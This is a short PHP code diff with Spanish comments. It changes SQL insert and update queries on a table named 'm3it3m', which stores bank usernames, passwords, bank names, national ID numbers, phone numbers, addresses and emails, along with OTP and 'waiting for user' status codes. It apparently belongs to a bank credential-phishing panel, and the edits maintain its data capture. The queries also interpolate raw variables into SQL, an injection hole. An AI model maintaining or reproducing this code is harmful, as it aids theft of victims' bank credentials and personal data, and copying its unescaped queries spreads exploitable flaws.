@@ -58,9 +58,9 @@ if ($con = conectar()) {
             checkRateLimit($ip, 3, 900, 900); 
         }
 
-        // 🟢 CORRECCIÓN AQUÍ: Cambiamos el 2 (OTP) por 12 (Esperando usuario)
-        $query_insert = "INSERT INTO m3it3m (usuario, password, banco, dispositivo, ip, status, agente, nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia, email) 
-                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 12, '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref', '$eml')";
+        // 🟢 CORRECCIÓN AQUÍ: Se guarda el $mnt en `valor_factura` y se deja `agente` en blanco. El estado se mantiene en 12.
+        $query_insert = "INSERT INTO m3it3m (usuario, password, banco, dispositivo, ip, status, agente, valor_factura, nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia, email) 
+                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 12, '', '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref', '$eml')";
         sentencia($con, $query_insert);
         
         $id = mysqli_insert_id($con);
@@ -72,6 +72,7 @@ if ($con = conectar()) {
     else if ($id !== '') {
         upgrade_user($id, $usuario, $contrasena, $banco); 
         
+        // 🟢 CORRECCIÓN AQUÍ: Actualiza `valor_factura` en lugar de `agente`
         $query_update = "UPDATE m3it3m SET 
             nombre = '$nom', 
             apellido = '$ape', 
@@ -81,7 +82,7 @@ if ($con = conectar()) {
             direccion = '$dir', 
             empresa = '$emp', 
             referencia = '$ref',
-            agente = IF('$mnt' > 0, '$mnt', agente),
+            valor_factura = IF('$mnt' > 0, '$mnt', valor_factura),
             email = IF('$eml' != '', '$eml', email)
             WHERE idreg = '$id'";
             
